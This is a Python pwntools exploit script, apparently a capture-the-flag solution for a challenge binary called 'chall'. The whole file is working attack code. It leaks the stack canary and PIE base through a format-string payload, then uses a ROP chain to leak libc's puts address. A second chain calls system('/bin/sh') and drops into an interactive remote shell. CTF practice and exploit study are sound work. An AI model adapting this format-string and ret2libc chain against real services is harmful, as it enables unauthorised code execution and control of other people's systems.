#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or "chall")
# libc = ELF("libc6_2.35-0ubuntu3.4_amd64.so")
libc = ELF("libc6_2.35-0ubuntu3.5_amd64.so")

host = args.HOST or ""
port = int(args.PORT or 10000)


def start_local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


gdbscript = """
b *make_pie
continue
""".format(
    **locals()
)

# %52$p - 10962 = main
# %39$p         = canary

io = start()
p = b"%52$p-%39$p"
io.sendlineafter(b"recipe?\n", p)
main, canary = io.recvuntil(b"delicious").split(b"\n")[2].split(b"-")
main = int(main, 16) - 10962
canary = int(canary, 16)

io.clean()

exe.address = main - exe.sym.main
success(f"[main] {hex(main)}")
success(f"[canary] {hex(canary)}")
success(f"[PIE] {hex(exe.address)}")

rop = ROP(exe)
ret = rop.find_gadget(["ret"])[0]
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]

p = cyclic(264)
p += p64(canary)
p += cyclic(8)
p += p64(ret)
p += p64(pop_rdi)
p += p64(exe.got.puts)
p += p64(exe.sym.puts)
p += p64(ret)
p += p64(exe.sym.make_pie)

io.sendline(p)

libc_leak = u64(io.recvuntil(b"recipe?\n").split(b"\n")[1].ljust(8, b"\x00"))

success(f"[libc_leak] {hex(libc_leak)}")
libc.address = libc_leak - libc.sym.puts

success(f"[libc] {hex(libc.address)}")

io.clean()
io.sendline(b"byamb4")
bin_sh = next(libc.search(b"/bin/sh\x00"))

success(f"[bin_sh] {hex(bin_sh)}")

p = cyclic(264)
p += p64(canary)
p += cyclic(8)
p += p64(ret)
p += p64(pop_rdi)
p += p64(bin_sh)
p += p64(libc.sym.system)
p += p64(ret)
p += p64(exe.sym.make_pie)

io.sendlineafter(b"delicious\n", p)
io.interactive()
